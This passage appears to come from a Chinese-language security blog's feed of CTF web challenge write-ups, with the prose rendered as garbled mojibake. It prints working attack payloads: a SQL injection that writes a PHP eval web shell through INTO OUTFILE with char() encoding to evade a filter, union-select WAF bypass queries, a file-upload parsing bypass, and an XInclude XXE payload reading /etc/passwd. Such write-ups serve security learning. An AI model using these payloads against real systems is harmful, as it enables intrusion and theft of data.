â€¦.&quot;;</code>ä½†æ˜¯wafé‡Œé¢å¾ˆæ˜æ˜¾å°±æ˜¯è¿‡æ»¤äº†selectæˆ‘ä»¬éœ€è¦å»ç»•è¿‡ä¸€ä¸‹è¿˜æœ‰å•åŒå¼•å·éƒ½è¢«è½¬ä¹‰ï¼Œè¿™å°±éœ€è¦<code>char()</code>ä»¥åŠ<code>concat()</code>å‡½æ•°çš„ååŠ©äº†ï¼Œä¹Ÿå¯ä»¥æ­£å¸¸æ˜¾ç¤º<br><a href="https://imgchr.com/i/Fm1GVI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/Fm1GVI.md.png" alt="Fm1GVI.md.png"></a><br>ä¸‹é¢å°±åˆ°ä½¿ç”¨<code>into outfile</code>çš„æ—¶å€™äº†ï¼Œä½†è¿˜æ˜¯å¾—å…ˆæ‰¾åˆ°é‚£ä¸€ä¸ªç›®å½•å¯ä»¥å†™æ–‡ä»¶ï¼Œè¿™é‡Œé¢æˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªä¸Šä¼ çš„åŠŸèƒ½ç‚¹æ²¡ç”¨åˆ°ï¼Œä¸€èˆ¬ä¸Šä¼ çš„è¯æˆ‘ä»¬éœ€è¦å¼€å¯å†™çš„æƒé™ï¼Œä½ è‡ªå·±å†™ä¸€æ¬¡ä¸Šä¼ çš„ä»£ç å°±ä¼šçŸ¥é“ï¼Œå¦‚æœæ²¡æœ‰å†™æƒé™çš„è¯ï¼Œå°±ä¼šä½¿æœåŠ¡å™¨æŠ¥é”™ï¼Œæ‰€ä»¥å›¾ç‰‡ä¿å­˜çš„åœ°æ–¹å°±åº”è¯¥æ˜¯å¯ä»¥ç›®å½•ï¼Œå¯ä»¥æŸ¥çœ‹å›¾åƒçš„ç›®å½•æ”¾åœ¨å“ª<br><img src="https://s1.ax1x.com/2018/11/30/Fm1YIP.png" alt="Fm1YIP.png"><br>åœ¨è¿™ä¸€ä¸ªç›®å½•ä¸‹ï¼Œè¿™æ ·æˆ‘ä»¬å°±åŸºæœ¬ç¡®å®šshellè¯¥æ”¾åœ¨å“ªé‡Œï¼Œè¿™é‡Œçš„è¯å…¶å®è¿˜æœ‰ä¸€ä¸ªç‚¹å°±æ˜¯ç½‘ç«™ç›®å½•è¦æ€ä¹ˆæ˜¾ç¤ºï¼Œå¯ä»¥åˆ©ç”¨show variables like â€˜secure_file_priv%â€™;å»æŸ¥çœ‹å¯¹åº”çš„ä¿¡æ¯ï¼Œå¦‚æœæ˜¯ç©ºçš„è¯è¯´æ˜å“ªé‡Œéƒ½å¯ä»¥è¯»æˆ–è€…å†™ç›®å½•äº†ï¼Œæ ¹æ®user.phpé‡Œé¢çš„ä»£ç å¯ä»¥çŸ¥é“æ‰§è¡Œä¹‹åä¼šæ˜¾ç¤º1,2,5åˆ—ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªè¯­å¥è½¬åŒ–ä¸€ä¸‹å°±å¯ä»¥çŸ¥é“é‚£ä¸ªç›®å½•å¯ä»¥å†™äº†ï¼Œè¿™æ ·æ¯”çŒœé è°±å¤šäº†ã€‚ã€‚ã€‚ã€‚<br><a href="https://imgchr.com/i/Fm1aRS" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/Fm1aRS.md.png" alt="Fm1aRS.md.png"></a></p><p>ç°åœ¨å°±å¯ä»¥æ„é€ ä¸€ä¸‹è¯­å¥äº†<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos; into outfile &apos;/var/www/html/favicon/over.php&apos;&quot;</span><br></pre></td></tr></table></figure></p><p>æŠŠåŒå¼•å·é‡Œé¢çš„ä¸œè¥¿è½¬ä¸€ä¸‹<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> @b=<span class="keyword">concat</span>(<span class="built_in">CHAR</span>(<span class="number">115</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">60</span>, <span class="number">63</span>, <span class="number">112</span>, <span class="number">104</span>, <span class="number">112</span>, <span class="number">32</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">40</span>, <span class="number">36</span>, <span class="number">95</span>, <span class="number">80</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">91</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">93</span>, <span class="number">41</span>, <span class="number">59</span>, <span class="number">63</span>, <span class="number">62</span>, <span class="number">39</span>, <span class="number">32</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">111</span>, <span class="number">32</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">102</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">119</span>, <span class="number">119</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">109</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">102</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">111</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">46</span>, <span class="number">112</span>, <span class="number">104</span>, <span class="number">112</span>, <span class="number">39</span>));</span><br><span class="line"><span class="keyword">PREPARE</span> s <span class="keyword">from</span> @b;</span><br><span class="line"><span class="keyword">EXECUTE</span> s;</span><br></pre></td></tr></table></figure></p><p>ä½†æ˜¯è¿™æ ·è¿˜æ˜¯ä¸è¡Œï¼Œå› ä¸º@ä¼šè¢«æ›¿æ¢æˆ@-@ï¼Œæ‰€ä»¥å¾—åˆ©ç”¨é»‘åå•çš„æ›¿æ¢åŠŸèƒ½æŠŠ@å˜æˆé»‘åå•é‡Œé¢çš„ä¸œè¥¿ï¼Œç»è¿‡é»‘åå•æ›¿æ¢åå°±ä¼šå˜æˆ@å•¦<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> ^b=<span class="keyword">concat</span>(<span class="built_in">CHAR</span>(<span class="number">115</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">60</span>, <span class="number">63</span>, <span class="number">112</span>, <span class="number">104</span>, <span class="number">112</span>, <span class="number">32</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">40</span>, <span class="number">36</span>, <span class="number">95</span>, <span class="number">80</span>, <span class="number">79</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">91</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">93</span>, <span class="number">41</span>, <span class="number">59</span>, <span class="number">63</span>, <span class="number">62</span>, <span class="number">39</span>, <span class="number">32</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">111</span>, <span class="number">32</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">102</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">119</span>, <span class="number">119</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">109</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">102</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">111</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">46</span>, <span class="number">112</span>, <span class="number">104</span>, <span class="number">112</span>, <span class="number">39</span>));</span><br><span class="line"><span class="keyword">PREPARE</span> s <span class="keyword">from</span> ^b;</span><br><span class="line"><span class="keyword">EXECUTE</span> s;</span><br></pre></td></tr></table></figure></p><p>ç„¶åæ‰¾åˆ°<code>favicon/over.php</code>ç›´æ¥èœåˆ€è¿æ¥å°±å¯ä»¥äº†<br><a href="https://imgchr.com/i/Fm3nwn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/Fm3nwn.md.png" alt="Fm3nwn.md.png"></a><br><code>flag{f6c5acfd4192b4152661d19b411d2d63}</code></p><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>è¿™é‡Œå°±ç®€å•å°ç»“ä¸€ä¸‹:<br>1.python flaskçš„sessionæœºåˆ¶é—®é¢˜ï¼Œå¯ä»¥åˆ©ç”¨å…¶æ„é€ ç®¡ç†å‘˜èº«ä»½ç™»å½•<br>2.æ„é€ è½¯è¿æ¥å»è¯»å–æ–‡ä»¶å†…å®¹<br>3.æ³¨å…¥ç‚¹å¦‚ä½•æ„é€ é€»è¾‘ï¼Œå¦‚ä½•æµ‹è¯•é€šè¿‡æ³¨å†Œé¡µé¢æ¢æµ‹è¿‡æ»¤å­—ç¬¦ä»¥åŠè¿‡æ»¤æ–¹å¼<br>4.åˆ©ç”¨ä¼ªåè®®è¯»å–æ–‡ä»¶ï¼Œå¹¶ä¸”å¦‚ä½•åˆ©ç”¨ä¼ªåè®®è¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br>5.PHPååºåˆ—åŒ–é‡Œé¢çš„__get()æ–¹æ³•èµ·åˆ°çš„ä½œç”¨ï¼Œå¦‚ä½•å»ä½¿ç”¨å®ƒå¯¹å¯æ§å˜é‡èµ‹å€¼<br>6.åˆ©ç”¨SQLæ³¨å…¥è¯»å†™æ–‡ä»¶çš„å‰æï¼Œå¦‚ä½•æŸ¥çœ‹<br>7.å‘½ä»¤æ‰§è¡Œä»¥åŠSQLæ³¨å…¥ç»•è¿‡çš„ä¸€äº›å°trick</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å®‰æ’10æœˆèµ›Webé¢˜ç›®å¤ç°</title>
      <link href="/anheng-10month.html"/>
      <url>/anheng-10month.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>10æœˆèµ›çš„æ—¶å€™å»æ‰“é‚£ä¸ªç“œçš®çš„é¢†èˆªæ¯(ä½“éªŒæå·®)ï¼Œè¿˜æ˜¯å›æ¥å¤ç°å®‰æ’çš„é¢˜ç›®æ¯”è¾ƒå¥½<a id="more"></a>ï¼Œè´¨é‡è¿˜æ˜¯æœ‰ä¿è¯çš„ï¼Œå­¦åˆ°å¾ˆå¤šä¸œè¥¿</p><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><h3 id="easy-audit"><a href="#easy-audit" class="headerlink" title="easy audit"></a>easy audit</h3><p>è¿™ä¸ªé¢˜ç›®ç¡®å®æœ‰ç‚¹è„‘æ´ã€‚ã€‚è¿ç”¨äº†ä¸¤ä¸ªphpå‡½æ•°ä¸€ä¸ªæ˜¯<code>get_defined_functions</code>è¿™ä¸ªå‡½æ•°æ˜¯ç”¨äºè¿”å›æ‰€æœ‰å·²å®šä¹‰å‡½æ•°çš„æ•°ç»„ï¼Œè€Œå¦å¤–ä¸€ä¸ªåˆ™æ˜¯<code>get_defined_vars</code> è¿™ä¸ªå‡½æ•°æ˜¯è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„<br>å¯ä»¥æŸ¥çœ‹æ­¤ç½‘å€:<a href="https://www.jb51.net/article/42890.htm" target="_blank" rel="noopener">https://www.jb51.net/article/42890.htm</a></p><p>å³é”®æŸ¥çœ‹æºä»£ç å‘ç°å­˜åœ¨<code>index.php?func1</code>ï¼Œé‚£ä¹ˆè¿™ä¸ªå‚æ•°ç©¶ç«Ÿæœ‰ä»€ä¹ˆä½œç”¨å¯ä»¥å…ˆå°è¯•ä¸€ä¸‹ï¼Œä¸Šæ‰‹å°±æ¥ä¸€ä¸ªphpinfoï¼Œå‘ç°ç›´æ¥æœ‰å›æ˜¾<br><a href="https://imgchr.com/i/iH0hd0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iH0hd0.md.png" alt="iH0hd0.md.png"></a><br>çŒœæµ‹æ˜¯ç›´æ¥è¿è¡Œå‡½æ•°ä¹‹ç±»çš„åŠŸèƒ½,ç„¶åè¿ç”¨get_defined_functions è·å¾—å…¨å±€çš„å‡½æ•°è¿™é‡Œé¢çš„å‡½æ•°æœ‰å†…ç½®çš„ä¹Ÿæœ‰å¼€å‘äººå‘˜è‡ªå·±å®šä¹‰çš„å‡½æ•°ï¼Œå¯ä»¥å‘ç°æœ€åçš„è¿™ä¸€ä¸ªå‡½æ•°ç‰¹åˆ«æ˜¾çœ¼ï¼Œè°ƒç”¨ä¸€ä¸‹è¿™ä¸ªå‡½æ•°å‘ç°æœ‰æºç å‡ºæ¥<br><a href="https://imgchr.com/i/iH0TWF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iH0TWF.md.png" alt="iH0TWF.md.png"></a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//include 'real_flag.php';</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jam_source_ctf_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jam_flag</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])?$_GET[<span class="string">'a'</span>]:<span class="string">'123'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gen_str</span><span class="params">($m=<span class="number">6</span>)</span></span>&#123;</span><br><span class="line">        $str = <span class="string">''</span>;</span><br><span class="line">        $str_list = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span>;</span><br><span class="line">        <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$m;$i++)&#123;</span><br><span class="line">            $str .= $str_list[rand(<span class="number">0</span>,strlen($str_list)<span class="number">-1</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">GiveYouTheFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'real_flag.php'</span>;</span><br><span class="line">        $secret = <span class="keyword">$this</span>-&gt;gen_str();</span><br><span class="line">        <span class="comment">//echo $secret;</span></span><br><span class="line">        <span class="keyword">if</span>($secret === <span class="keyword">$this</span>-&gt;a)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $real_flag;<span class="comment">//echo $flag</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'want to use me?'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;GiveYouTheFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> rand().<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">$_flag = <span class="keyword">new</span> jam_flag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]) &amp;&amp; $_POST[<span class="string">'flag'</span>] === <span class="string">'I want the flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'real_flag.php'</span>;</span><br><span class="line">    $_flag-&gt;GiveYouTheFlag();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>è¿™æ®µä»£ç å¤§è‡´çš„æ„æ€å°±æ˜¯æ–°å»ºäº†ä¸€ä¸ªç±»ï¼Œç„¶åè°ƒç”¨ç±»é‡Œé¢çš„å‡½æ•°æŠŠflagç»™è¾“å‡ºæ¥<br>è¿™é‡Œæˆ‘ä»¬ç”¨åˆ°<code>get_defined_vars</code>è¿™ä¸ªå‡½æ•°ï¼Œå•ç‹¬ä½¿ç”¨æ˜¯ä¸èƒ½è¾“å‡ºflagçš„ï¼Œå¯èƒ½åˆ°è¿™é‡Œä¼šå­˜åœ¨ç–‘é—®è¾“å‡ºflagçš„å‡½æ•°åº”è¯¥è¿˜å¾—æ»¡è¶³<code>$secret === $this-&gt;a</code>è€Œè¿™ä¸ªsecretåˆæ˜¯éšæœºç”Ÿæˆçš„ï¼Œé‚£è¦æ€ä¹ˆåŠï¼Œå…¶å®ä¸éœ€è¦ï¼Œè¿™é‡Œçš„flagæ˜¯å±äº<code>real_flag.php</code>é‡Œé¢çš„åªè¦æˆ‘ä»¬æŠŠé¡µé¢åŒ…å«è¿›æ¥æˆ‘ä»¬å°±å¯ä»¥æŠŠè¯¥é¡µé¢æ‰€æœ‰å˜é‡å€¼éƒ½ç»™æ‰“å°å‡ºæ¥äº†ï¼Œæ‰€ä»¥å…³é”®ç‚¹è¿˜å¾—æ»¡è¶³è¿™ä¸ªæ¡ä»¶<br><code>isset($_POST[&#39;flag&#39;]) &amp;&amp; $_POST[&#39;flag&#39;] === &#39;I want the flag&#39;</code><br>å³å¯åŒ…å«real_flag.phpï¼Œè¿™åº”è¯¥æ˜¯å‡ºé¢˜äººæ•…æ„ç•™çš„ä¸ç„¶ä¹Ÿè¾“å‡ºä¸äº†flagï¼Œ23333<br><a href="https://imgchr.com/i/iHBiyd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBiyd.md.png" alt="iHBiyd.md.png"></a><br>å‘åŒ…å¾—åˆ°flag<br><a href="https://imgchr.com/i/iHBAeI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBAeI.md.png" alt="iHBAeI.md.png"></a></p><h3 id="æ‰‹é€Ÿè¦å¿«"><a href="#æ‰‹é€Ÿè¦å¿«" class="headerlink" title="æ‰‹é€Ÿè¦å¿«"></a>æ‰‹é€Ÿè¦å¿«</h3><p>è¿™ä¸ªé¢˜ç›®è¿›å»ä¹‹åè¦ç™»å½•ï¼Œå³é”®æŸ¥çœ‹æºä»£ç æ‰¾æ‰¾httpå¤´éƒ¨å•¥çš„å‘ç°é‡Œé¢æœ‰ä¸€ä¸ªpasswordï¼Œç›´æ¥å¤åˆ¶æäº¤å°±å¯ä»¥ç™»é™†ä¸Šå»ï¼Œç™»é™†ä»¥åæ˜¯ä¸€ä¸ªuploadé¡µé¢<br><img src="https://s1.ax1x.com/2018/11/08/iHBMlQ.png" alt="iHBMlQ.png"><br><img src="https://s1.ax1x.com/2018/11/08/iHBlOs.png" alt="iHBlOs.png"></p><p>ç„¶åå°è¯•ä¸Šä¼ ä¸€ä¸ªå°é©¬ï¼Œå‘ç°ä¸è¡Œï¼Œç„¶åå°è¯•æ”¹ä¸€ä¸‹åç¼€å‘ç°è¿™åº”è¯¥æ˜¯é»‘åå•è¿‡æ»¤çš„ï¼Œå› ä¸ºå°è¯•äº†<code>php2,php3.php4</code>éƒ½å¯ä»¥ä¸Šä¼ ï¼Œä½†æ˜¯å´ä¸èƒ½è§£ææŠŠä»–ä»¬éƒ½å½“åšæ–‡æœ¬è§£æäº†<br><a href="https://imgchr.com/i/iHBapF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBapF.md.png" alt="iHBapF.md.png"></a><br>ä½†æ˜¯å¯ä»¥å‘ç°æœåŠ¡å™¨ç‰ˆæœ¬æ˜¯<code>Apache/2.4.6</code>ï¼Œè¿™é‡Œå¯èƒ½å­˜åœ¨è§£ææ¼æ´ï¼ŒæŠŠåç¼€åæ”¹ä¸ºApacheä¸è®¤è¯†çš„å°±å¯ä»¥äº†<br><a href="https://imgchr.com/i/iHBw6J" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBw6J.md.png" alt="iHBw6J.md.png"></a><br><a href="https://imgchr.com/i/iHB7AP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHB7AP.md.png" alt="iHB7AP.md.png"></a><br>flagç›´æ¥åœ¨ä¸Šå±‚ç›®å½•flag{698539765730b69026796420b9201e03}</p><h2 id="CoolCms"><a href="#CoolCms" class="headerlink" title="CoolCms"></a>CoolCms</h2><p>åŸæ¥è¿™ä¸ªé¢˜ä¸€å¶é£˜é›¶å­¦é•¿å‡ºçš„é¢2333<br>è¿™ä¸ªç½‘ç«™ä¸¤ä¸ªåœ°æ–¹å¯èƒ½å­˜åœ¨æ¼æ´ä¸€ä¸ªå°±æ˜¯<code>article.php</code>é¡µé¢å­˜åœ¨SQLæ³¨å…¥ï¼Œå› ä¸ºè¿™é‡Œé¢idå‚æ•°æš´éœ²äº†å‡ºæ¥ï¼Œå¦å¤–å°±æ˜¯åœ¨<code>write.php</code>é¡µé¢ä¸Šå¯èƒ½å­˜åœ¨xxeæ–‡ä»¶è¯»å–<br>ç°åœ¨å¯èƒ½å­˜åœ¨çš„æ³¨å…¥é¡µé¢è¾“å…¥3çš„æ—¶å€™å°±ä¼šå‡ºç°<code>table flag????</code>ï¼Œå†fuzzæµ‹è¯•ä¸€ä¸‹å‘ç°<code>orï¼Œupdateï¼Œdeleteï¼Œ</code>ä»¥åŠé€—å·ç­‰ç¬¦å·éƒ½è¢«è¿‡æ»¤äº†<br><a href="https://imgchr.com/i/iHBL9S" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHBL9S.md.png" alt="iHBL9S.md.png"></a></p><p>æœ¬æ¥å°±æ˜¯é£˜é›¶å­¦é•¿å‡ºçš„é¢˜ç›®å°±å»å‚è€ƒä»–çš„åšå®¢å‘€<br><a href="http://skysec.top/2018/02/02/skysql%E4%B9%8Bunion%E7%BB%95waf/" target="_blank" rel="noopener">http://skysec.top/2018/02/02/skysql%E4%B9%8Bunion%E7%BB%95waf/</a><br><a href="http://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/" target="_blank" rel="noopener">http://skysec.top/2018/08/18/%E6%B5%85%E6%9E%90xml%E4%B9%8Bxinclude-xslt/</a></p><p>æˆ‘ä»¬å¯ä»¥ä»fuzzçš„ç»“æœå‘ç°è¿™é‡Œé¢çš„<code>union</code>è¿˜æœ‰<code>select</code>éƒ½å¯ä»¥å•ç‹¬ä½¿ç”¨ä½†ä¸€æ—¦ä»–ä»¬ä¸¤ä¸ªä¸€èµ·ä½¿ç”¨çš„æ—¶å€™ï¼Œå°±ä¼šè¢«wafæ‰ï¼ŒçŒœæµ‹åå°å†™çš„æ­£åˆ™æ˜¯è¿™æ ·å†™çš„<code>|union select|</code>ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨<code>%0b</code>å°†å…¶ç»•è¿‡ï¼Œä¹Ÿå°±æ˜¯<code>union%0bselect</code><br>ä½†æ˜¯é€—å·åˆè¢«è¿‡æ»¤äº†ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ç”¨<code>join</code>å»ç»•è¿‡<br><img src="https://s1.ax1x.com/2018/11/08/iHDk3F.png" alt="iHDk3F.png"><br>ç”¨<code>join</code>å®ç°åŒæ ·çš„æ•ˆæœ<br><a href="https://imgchr.com/i/iHDAc4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDAc4.md.png" alt="iHDAc4.md.png"></a></p><p><code>or</code>è¢«è¿‡æ»¤äº†ï¼Œ<code>information_schema</code>æ²¡æ³•ä½¿ç”¨ï¼Œè™½ç„¶é¢˜ç›®è¿™é‡Œæç¤ºäº†æˆ‘ä»¬è¡¨åä¸ºflagï¼Œä½†æ˜¯å­—æ®µåå´æ— ä»çŸ¥æ™“ï¼Œè¿™æ—¶å€™å°±å¯ä»¥åˆ©ç”¨è”åˆå¡«å……æ¥ä»£æ›¿æ‰å­—æ®µåå’Œè¡¨å<br><img src="https://s1.ax1x.com/2018/11/08/iHDmH1.png" alt="iHDmH1.png"></p><p><a href="https://imgchr.com/i/iHDtHI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDtHI.md.png" alt="iHDtHI.md.png"></a><br>å¯ä»¥å‘ç°ç°åœ¨å­—æ®µåå˜æˆäº†1,2,3ï¼Œæ‰€ä»¥è¦æŸ¥æ‰¾é‡Œé¢çš„å†…å®¹å¯ä»¥ç”¨ç”¨ä¸‹é¢çš„è¯­å¥<br><code>select * from users where id=-1 union select 1,(select i.2 from (select 1,2,3 union select * from users)i limit 1,1),3;</code><br><a href="https://imgchr.com/i/iHDd4f" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDd4f.md.png" alt="iHDd4f.md.png"></a></p><p>è¿™æ ·å³å¯æ— éœ€å­—æ®µåæ¥æŸ¥æ‰¾æ•°æ®ï¼Œç„¶åé€šè¿‡limitè¯­å¥ä¸€æ¡æ¡æŸ¥å³å¯ï¼Œè¿™é‡Œæ˜¯å› ä¸ºé€—å·è¢«è¿‡æ»¤äº†æ‰€ä»¥æˆ‘ä»¬ç”¨offsetæ¥æ›¿ä»£<br>å› æ­¤å…ˆæµ‹è¯•ä¸€ä¸‹å“ªä¸€åˆ—æœ‰å›æ˜¾<br><code>-1&#39; union%0bselect * from (select 1)x join (select 2)y join (select 3)k join (select 4)l--+</code>å‘ç°ç¬¬äºŒåˆ—è·Ÿç¬¬å››åˆ—æœ‰å›æ˜¾<br><a href="https://imgchr.com/i/iHD0C8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHD0C8.md.png" alt="iHD0C8.md.png"></a></p><p>æ¥ç€ç›´æ¥ç”¨ä¸Šé¢çš„å¥—è·¯è¯»å‡ºflagçš„è·¯å¾„<code>-1&#39; union%0bselect * from (select 1)x join (select 2)y join (select 3)k join (select i.4 from (select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d union%0bselect * from flag)i limit 1 offset 1)l-- k</code><br>å¾—åˆ°è·¯å¾„æ˜¯<code>/home/fff123aggg</code><br><a href="https://imgchr.com/i/iHD2Eq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHD2Eq.md.png" alt="iHD2Eq.md.png"></a><br>å¼€å§‹ç”¨xxeè¯»å–æ–‡ä»¶ï¼Œå…ˆè¯•ä¸€ä¸‹<code>/etc/passwd</code>,æˆåŠŸå›æ˜¾<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"file:///etc/passwd"</span> <span class="attr">parse</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><a href="https://imgchr.com/i/iHDW5V" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHDW5V.md.png" 